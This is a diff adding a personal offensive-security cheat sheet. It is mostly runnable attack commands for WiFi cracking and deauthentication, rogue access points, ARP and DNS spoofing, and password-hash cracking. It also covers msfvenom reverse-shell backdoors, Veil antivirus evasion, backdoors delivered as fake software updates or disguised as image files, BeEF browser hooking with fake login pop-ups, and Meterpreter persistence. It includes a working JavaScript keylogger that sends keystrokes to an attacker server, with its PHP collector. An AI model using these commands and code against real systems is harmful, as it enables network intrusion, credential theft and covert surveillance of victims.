@@ -1,0 +1,671 @@
+apt-get install virtualbox-guest-x11
+
+
+Multi-window terminal:
+apt-get install terminator
+
+
+*********************************************************************************************************
+Wireless
+*********************************************************************************************************
+Increase power of WiFi Adapter (if it supports it)
+ifconfig wlan0 down
+iw reg set BO   not B oh, no B zero
+ifconfig wlan0 up
+iwconfig wlan0 txpower 30
+	sets power to 30 Dbs, normal is 15. Setting to high can damage card
+iwconfig
+	notice the txpower, it should not be increased
+
+
+Change MAC Address
+	ifconfig wlan0 down
+	macchanger --mac=XX:XX:XX:XX:XX:XX wlan0
+		specifies customer MAC address
+	macchanger --random wlan0
+		creates random MAC
+	ifconfig wlan0 up
+
+Enable Monitor Mode on WiFi Adapter
+	ifconfig wlan0 down
+	airmon-ng start wlan0
+	iwconfig wlan0mon
+		that is iWconfig
+	ifconfig wlan0mon up
+
+
+	Stop monitor mode:
+	airmon-ng stop wlan0mon		
+
+
+		or
+
+	ifconfig wlan0 down
+	iwconfig wlan0 mode monitor
+	iwconfig wlan0
+	ifconfig wlan0 up
+
+
+	Stop monitor mode:
+	ifconfig wlan0 down
+	iwconfig wlan0 mode managed
+	iwconfig wlan0
+	ifconfig wlan0 up
+
+	
+		or
+
+	ifconfig wlan0 down
+	airmon-ng check kill
+	airmon-ng start wlan0
+	iwconfig wlan0mon
+	ifconfig wlan0mon up
+
+
+	Stop monitor mode:
+	airmon-ng stop wlan0mon		
+
+
+
+Packing Sniffing with Airodump-ng
+	ifconfig wlan0 down
+	airmon-ng start wlan0
+	iwconfig wlan0mon
+	ifconfig wlan0mon up
+
+	airodump-ng wlan0mon		# all networks
+					# Get Channel and BSSID of victim
+					# Data column show data seen on that network
+
+	Targeted:
+		airodump-ng --channel 2 --bssid 2C:30:33:CD:8C:4E --write out.cap wlan0mon
+
+
+
+Deauth Clients on a network
+All clients (doesn’t always work):
+	aireplay-ng --deauth [# of deauth packets] -a [AP] [Interface]
+	aireplay-ng --deauth 1000 -a E4F4:C6:E6:0C:D1 wlan0mon
+
+Specific client:
+	aireplay-ng --deauth [# of deauth packets] -a [AP] -c [target] [Interface]
+	aireplay-ng --deauth 1000 -a E4:F4:C6:E6:0C:D1 -c F0:25:B7:FF:1E:42 wlan0mon
+
+
+
+
+Create a Fake Access-Point:
+	Need 2 NIC’s -> one for wireless AP and one for internet connection
+
+Mana-toolkit -> automatically creates a new AP and starts sslstrip/firelamp and
+	even attempts to bypass HSTS used by Gmail and Facebook
+
+	Install:
+		apt-get install mana-toolkit
+
+	config file is located in:
+		/etc/mana-toolkit/hostapd-mana.conf
+			add the name of the wireless card when it is in monitor mode
+
+	3 start up scripts located in:
+		/usr/share/mana-toolkit/run-mana/
+
+		start-noupstream.sh	#starts an AP with NO internet connection
+		start-nat-simple.sh	#starts an AP using internet connection on 2nd NIC
+		start-nat-full.sh	#starts AP with internet, starts sslstrip, firelamp, HSTS
+			modify scripts so that the phy interface is the wireless card (wlan0mon) and the
+			upstream is the name of the internet connected interface (eth0)
+			
+	bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+
+
+WEP Cracking:
+	Put card in monitor mode:
+		ifconfig wlan0 down
+		airmon-ng start wlan0
+		iwconfig wlan0mon
+		ifconfig wlan0mon up
+
+	Look for networks to crack:
+		airodump-ng wlan0mon
+
+		Log traffic from the victim network:
+			airodump-ng --channel 6 --bssid [bssid] --write traffic.cap [interface]
+			airodump-ng --channel 11 --bssid E4:F4:C6:E6:0C:D1 --write traffic.cap wlan0mon
+		
+		At the same time we use aircrack-ng to crack the key using the captured traffic
+			aircrack-ng [file name from above]
+			aircrack-ng traffic.cap-01.cap		
+
+
+	If traffic levels are low. We can inject auth packets:
+		Display connected clients and data/traffic info about AP:
+			airodump-ng --bssid E4:F4:C6:E6:0C:D1 --channel 11 wlan0mon
+
+
+		Rerun the above command, but this time set it to capture packets:
+			airodump-ng --bssid E4:F4:C6:E6:0C:D1 --channel 11 --write output.cap wlan0mon
+		
+		
+		Set Auth Mode to OPEN and allow communication between my computer and AP:
+			aireplay-ng --fakeauth 0 -a [BSSID] -h [your MAC] [interface]
+			aireplay-ng --fakeauth 0 -a E4:F4:C6:E6:0C:D1 -h 74:DA:38:6B:9D:F7 wlan0mon
+
+
+		ARP request and reply (must capture an ARP request for this to work):
+			aireplay-ng --arpreplay -b [BSSID] -h [your MAC] [interface]
+			aireplay-ng --arpreplay -b E4:F4:C6:E6:0C:D1 -h 74:DA:38:6B:9D:F7 wlan0mon
+
+
+		Crack Packets:
+			aircrack-ng output.cap-01.cap
+		
+
+WPS WiFi Protected Setup:
+	Uses 8 digit long pin. Can crack it within 10 hours
+
+	List AP's with WPS enabled:
+		wash -i wlan0mon
+			Check Lck is no. That means WPS is locked out.
+
+	Brute force WPS with reaver:
+		reaver -b [BSSID] -c [channel] -i [interface]
+		reaver -b E4:F4:C6:E6:0C:D1 -c 11 -i wlan0mon 
+
+
+	
+
+
+WPA Cracking:
+	Requires 4-way Handshake be captured. 
+	
+	Put wireless card in monitor mode.
+
+	Start capturing packets:
+		airodump-ng --bssid E4:F4:C6:E6:0C:D1 --channel 11 --write output.cap wlan0mon
+
+
+	Deauthenticate a client in hopes that it will reconnect and you capture it.
+		aireplay-ng --deauth [number of deauth packets] -a [BSSID] -c [client to deauth] [int]
+		aireplay-ng --deauth 4 -a E4:F4:C6:E6:0C:D1 -c 00:AA:11:44:33:22 wlan0mon
+
+		WPA Handshake will show at top of airodump screen if captured
+
+	Crack handshake with password list:
+		aircrack-ng [capture file] -w [wordlist] 
+		aircrack-ng caputure.cap-01.cap -w /usr/share/john/password.lst 
+
+
+create a password list:
+	crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file
+	crunch 6 8 123456!"$% -o wordlist.txt -t a@@@@b
+			a@@@@b -> mean you want all passwords to start with a and end with b
+
+	crunch 8 20 -f ~/crunch-3.6/charset.lst mixalpha-numeric | aircrack-ng -w - -b E4:F4:C6:E6:0C:D1 output.cap
+		the -w - tells aircrack-ng to take input from crunch
+
+		run "xsensors" to see CPU temperatures when running crunch
+
+
+Fern WiFi cracker -> GUI front-end for Aircrack-ng
+	fern-wifi-cracker from terminal or Application menu -> Wireless Attacks -> FERN WiFi cracker
+
+
+Hashcat
+	prepare Airdump-ng capture file for use with hashcat
+	Download Hashcat utils here:
+		https://github.com/hashcat/hashcat-utils
+		Unzip and run Make
+		Command to convert to hashcat format:
+		hashcat-utils/src/cap2hccapx.bin Centurylink.cap CenturyHash.cap
+			Centurylink.cap -> capture files created by airdump-ng
+			CenturyHash.cap -> new file in Hashcat format, will be called CenturyHash.cap.hccap
+		
+	hashcat -m 2500 -a 3 -D 2 CenturyHash.cap.hccap ?d?d?d?d?d?d?d?d		
+		-m 2500			Hash mode 2500 which is WPA
+		-a 3			Brute-Force
+		-D 2			Force use of GPU
+		?d?d?d?d?d?d?d?d	d mean 0-9 in the ? space. crack 8 character password
+
+	Crack /etc/shadow:
+	hascat -m 500 -a 3 -D 2 -i -1 ?l?u?d shadow ?1?1?1?1?1?1?1?1
+		-i 		increment from 1 up to length of mask
+		-1 ?l?u?d	defines customer character set
+				?l -lower case letters a-z
+				?u -uppercase letters A-Z
+				?d -number 0-9	
+		shadow		/etc/shadow file to crack
+		?1?1?1?1?1?1?1?1 use customer character set for each location
+				 with a max of 8 characters
+		--force -D 1	Force the use of CPU instead of GPU
+
+	hashcat -m 1000 -a 3 -D 2 -1 ?u -2 ?l -3 ?d\!\@\#\$\%\^\&\* hash.txt ?1?2?2?2?2?2?2?3
+		-1 ?u		defines customer character set
+				?l -lower case letters a-z
+				?u -uppercase letters A-Z
+				?d -number 0-9	
+				?s -extended characters «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~		
+		-2 ?l		?l -lower case letters
+		-3 ?s\!\@...	select extended characters
+		-m 1000		NTLM windows hash
+		hash.txt	hash file generated from pwdump7 https://www.aldeid.com/wiki/Pwdump
+
+
+	If running in xwindows:
+		run "xsensors" to see CPU temperatures when running crunch
+		run "nividia-settings" to see GPU temp when running hashcat
+
+
+
+*********************************************************************************************************
+Net Pen
+*********************************************************************************************************
+
+Net Discover -> tool for discovering hosts on a network:
+	netdiscover -i [interface[ -r [range]
+	netdiscover -i eth0 -r 192.168.1.0/24
+
+
+
+MITM Framework
+	Man-in-the-middle framwork for ARP poisoning. Integrates SSLStrip too
+	Install: apt-get install mitmf
+	pip uninstall twisted
+	cd /usr/share/mitmf
+	wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2
+	pip install ./Twisted-15.5.0.tar.bz2
+
+	mitmf --arp --spoof --gateway [gateway ip] --target [target ips] -i [interface]
+	mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.111 -i eth0
+
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+	Pinecam -> http login in the forums
+	hotmail.com -> works with SSLStrip
+
+
+	DNS Spoofing:
+		Edit DNS Settings:
+			vi /etc/mitmf/mitmf.conf
+				[[[A]]]
+				*.google.com=192.168.1.112
+			This resolves any DNS request to the google.com domain to my evil IP
+		mitmf --arp --spoof --gateway [gateway ip] --target [target ips] -i [interface] --dns
+		mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.111 -i eth0 --dns
+
+
+	MITMf Plugins:
+		mitmf --arp --spoof --gateway [gateway ip] --target [target ips] -i [int] --[plugin] --[plugin options]
+
+		mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.111 -i eth0 --screen 	
+			takes a screen shot every 10 seconds of victim computer	
+			screen shots stored in /var/log/mitmf/
+	
+		mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.111 -i eth0 --jskeylogger
+			key stroke logger
+
+		mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.111 -i eth0 --inject --js-payload "alert(1)"
+			inject javascript code
+			
+	
+	Pinecam -> http login in the forums
+	hotmail.com -> works with SSLStrip
+
+
+	
+		
+	
+xarp -> utility to detect changes in arp table.
+
+
+Session Hijacking with ferret-sidejack 
+	This allows you to sniff cookies and inject them into your own requests to hijack a victim session
+	
+	dpkg --add-architecture i386
+	apt-get update
+	apt-get install ferret-sidejack:i386
+
+	ferret -i [interface]
+
+	hamster
+		open browser, set proxy to 127.0.0.1:1234 -> don't think you need to do this.
+		browse to http://127.0.0.1:1234
+			set adapter: eth0 
+
+		Use dailymotion.com account for this
+
+
+
+rsh -> remote shell
+	typically uses ports 512-514 
+	apt-get install rsh-client
+		this will not be aliased to ssh and won't require a password
+
+	
+
+psql -> connect to Postgres SQL server:
+	psql -h 10.1.1.2 -U postgres
+		select current_database();
+
+
+
+sparta	tool that performs nmap scan, then run other scanners based on what nmap finds. For example:
+	if nmap discovers a web server on port 80, sparta runs nikto against it. port 3306, mysql login, etc
+
+	apt-get install sparta
+	
+	Can save to file to open at later date.
+
+
+	
+*********************************************************************************************************
+Client Side Attacks
+*********************************************************************************************************
+
+Metasploit backdoor:
+	Windows Example:
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=443 -f exe > myfile.exe
+		-f is for file type; can be elf, exe, msi, jar, jsp, asp, war, osx-app, etc.
+
+	Android Example:
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=443 EXITFUNC=thread > myfile.apk
+
+	Can all do iOS
+
+
+	Then create a listener in metasploit:
+	msfconsole
+		use exploit/multi/handler
+		set payload windows/x64/meterpreter/reverse_tcp
+		set LHOST=10.1.1.1
+		set LPORT=443
+
+
+
+Veil -> helps generate payload executables that bypass AV
+	Installation:
+		apt-get install winbind
+		git clone https://github.com/Veil-Framework/Veil.git
+		cd Veil/setup
+		./setup.sh -c	
+	
+	Veil.py
+		
+		list		-> show tools
+		use 2		-> use evasion tool
+		list		-> shows payloads
+		use 9		-> uses payload 9 (cs/meterpreter/rev_http)
+		options		-> Shows info about payload
+		set LHOST <ip> 	-> sets Local Host that is called back to -> Same as Metasploit
+		generate	-> generates *.exe
+		checkvt		-> will check hash of *.exe against Virus Total hashes
+
+		places *.exe in /usr/share/veil-output/compiled/
+
+
+	Create listener in Metasploit
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_http
+		show options
+		set LHOST 192.168.1.149
+		exploit
+		sessions 1
+
+
+	Deliver the backdoor/client side attack via software updates using Evilgrade
+		Requires ARP Poisoning and DNS Spoofing
+		Evilgrade Install -> 
+			git clone https://github.com/infobyte/evilgrade.git
+			cd evilgrade
+			cpan Data::Dump
+			cpan Digest::MD5
+			cpan Time::HiRes
+			cpan RPC::XML
+			cpan isrcore::Shell
+					
+		cd evilgrade
+			add the following to the lines to the top of the evilgrade file:
+				use FindBin;
+				use lib $FindBin::Bin;
+
+		./evilgrade
+			show modules		-> show programs we can hijack updates for
+			configure <module>	-> selects the module to use, i.e. configure safari
+			show options		-> shows configurable options
+			set agent		-> select *.exe used in your backdoor
+			start			-> starts webserver and dns server for delivering backdoor	
+
+		Do MITM attack
+			modify the /etc/mitmf/mitmf.conf file.
+				change the DNS port from 53 or it will conflict with Evilgrade
+				add the "VirtualHost" address you received in evilgrade as an A record
+					*.apple.com=192.168.1.149
+	
+			Run mitmf:
+				mitmf --arp --spoof --gateway [gw ip] --target [victim] -i [int] --dns
+				mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.111 -i eth0 --dns
+
+
+			Wait for victim to update their software, or for the software to check for update
+
+			
+	Attach backdoor to other file types (*.pdf, *.jpg, *.mp3) using AutoIt
+		Will already be installed from the Veil Installation
+			Runs in Wine
+		Create a script file called "execute-file.au3" put the following in it. 
+			shellExecute("image.jpg")
+				image.jpg is the name of a JPEG file used in the attack
+		
+		launch the AutoIt Compile Script from Applications -> Wine -> Programs -> AutoIt -> Compile Script
+			For source select the au3 file you created above.
+			Select a destination
+			For Custom Icon, convert the jpg to an ico. Then use it. Or use PDF icon for pdf, etc.
+			Check X64 if target is 64 bit.
+			Click Convert
+
+		
+	Spoof a file extension:
+		apt-get install gucharmap
+		gucharmap
+			Search -> Find
+				U+202E
+				click "Search in character details"
+				this is the right-to-left override. it keeps exe but make the file appear .jpg
+
+			Double click the highlighted box
+			Click the Copy button
+		rename file.exe to filegpj.exe, but paste the copied item between the e and g in the file name.
+			File name should now appear as fileexe.jpg
+		
+
+
+Armitage -> GUI front end for Metasploit
+	/etc/init.d/postgresql start
+	armitage
+
+		Hosts -> Add Hosts -> enter IP range
+		Hosts -> Nmap Scan -> Quick Scan (OS Detect)
+		Hosts -> Nmap Scan -> Intense Scan, Avenomll TCP ports
+		
+		Attacks -> Find Attacks
+
+		Attacks -> Hail Mary -> Attempts all exploits for the ports found from the scan (Autopwn!!)
+
+
+
+
+
+
+	
+*********************************************************************************************************
+Beef
+*********************************************************************************************************
+Click beef icon in the launcer
+
+UI Url: http://127.0.0.1:3000/ui/panel
+Hook: <script src="http://<ip of beef server>:3000/hook.js"></script>
+
+Man-in-the-Middle to with BEEF:
+mitmf --arp --spoof --gateway 1.1.1.1 --target 1.1.1.2 -i eth0 --inject --js-url http://<ip of beef serv>:3000/hook.js
+
+Once you have hooked a browser:
+	Commands:
+		Browser -> Hooked Domain -> Spyder Eye -> Takes picture of web browser screen
+
+		Browser -> Hooked Domain -> Create Alert Dialog -> creates a pop up message to the browser
+
+		Browser -> Hooked Domain -> Redirect Browser -> redirects request to site of your choice
+
+		Misc -> Raw JavaScript -> lets you run javascript of your choice. (Key stroke logger JS file)
+
+		Social Engineering -> Petty Theft -> Pops up fake login for the following:
+			facebook
+			linkedin
+			windows
+			youtube
+			yammer
+			ios
+
+		Social Engineering -> Fake Notification Bar (Chrome, Firefox or IE) -> install meterpreter
+			Change Plugin URL to http://<my server>/reverseshell.exe
+
+
+Java Script Keylogger Client:
+	var buffer = [];
+	var attacker = 'http://<server ip>/?c='
+
+	document.onkeypress = function(e) {
+	    var timestamp = Date.now() | 0;
+	    var stroke = {
+	        k: e.key,
+	        t: timestamp
+	    };
+	    buffer.push(stroke);
+	}
+
+	window.setInterval(function() {
+	    if (buffer.length > 0) {
+	        var data = encodeURIComponent(JSON.stringify(buffer));
+	        new Image().src = attacker + data;
+	        buffer = [];
+	    }
+	}, 200);
+
+PHP Script Keylogger Server use with the above client:
+	<?php
+	if(!empty($_GET['c'])) {
+	    $logfile = fopen('data.txt', 'a+');
+	    fwrite($logfile, $_GET['c']);
+	    fclose($logfile);
+	}
+	?>
+
+
+Hybrid Analysis -> Free malware analysis service 
+			
+
+
+*********************************************************************************************************
+Social Engineering Toolkit (SET)
+*********************************************************************************************************
+setoolkit
+
+
+
+
+
+
+*********************************************************************************************************
+Post Exploitation
+*********************************************************************************************************
+
+
+Meterpreter:
+	background		-> returns you to metasploit, sessions -l to see sessions
+
+	sysinfo			-> Shows info about target computer
+
+	ipconfig		-> shows all interfaces and ip address
+
+	ps			-> list running process
+
+	migrate	<pid>		-> migrate to a different running process (.i.e. explorer.exe)
+					migrate <process id>  
+	
+	pwd			-> present working directory
+
+	download <file name>	-> downloads file to local working directory
+	
+	upload <file name>	-> uploads file
+
+	execute -f <file name>	-> runs executable
+
+	shell			-> launch a command prompt instead of being in meterpreter
+
+	keyscan_start		-> starts key stroke logger
+
+	keyscan_dump		-> shows key strokes logged
+
+	keyscan_stop		-> stop key stroke logger
+
+	screenshot		-> takes a screenshot
+
+
+	run persistence -S	-> starts service with SYSTEM privileges. 
+
+	run persistence -U	-> start service as the logged in user
+
+	run persistence -X	-> start service when system boots
+
+	run persistence -U -i 20 -p 80 -r 10.1.1.1
+		-U run as user
+		-i tries to connect to metasploit every 20 seconds
+		-p 80 connect to metasploint on port 80
+		-r 10.1.1.1 ip address of metasploit
+
+		AV will detect this
+
+	
+Maintaining Access:
+	vail-evasion
+		c/meterpreter/rev_http_service
+		c/meterpreter/rev_tcp_service
+
+
+Use Metasploit and Veil-evasion executables and maintain persistence across reboot:
+	use exploit/windows/local/persistence
+	set EXE_NAME browser.exe	#this is the name that shows up under processes
+	set SESSION <session #>		#use existing meterpreter session
+	set STARTUP user		#run as logged in user
+
+	show advanced			#show advanced features of exploit
+	set EXE::Custom /backdoor.exe	#backdoor.exe was created in veil-evasion
+	exploit
+
+	
+	use exploit/multi/handler	#will listed for incoming connections
+	set PAYLOAD windows/meterpreter/reverse_http
+	show options
+	set LHOST 192.168.1.149
+	exploit
+	sessions 1
+
+
+
+
+
+
+
+scraping a web site:
+wget -mk https://site.com
+wget -mk -w 5 https://site.com
+	-w 5	wait 5 seconds between requests
+
+
+
+Web Sites Containing Exploits:
+	www.securityfocus.com
+	www.exploit-db.com
+	inj3ct0r.com
+	packetstormsecurity.org
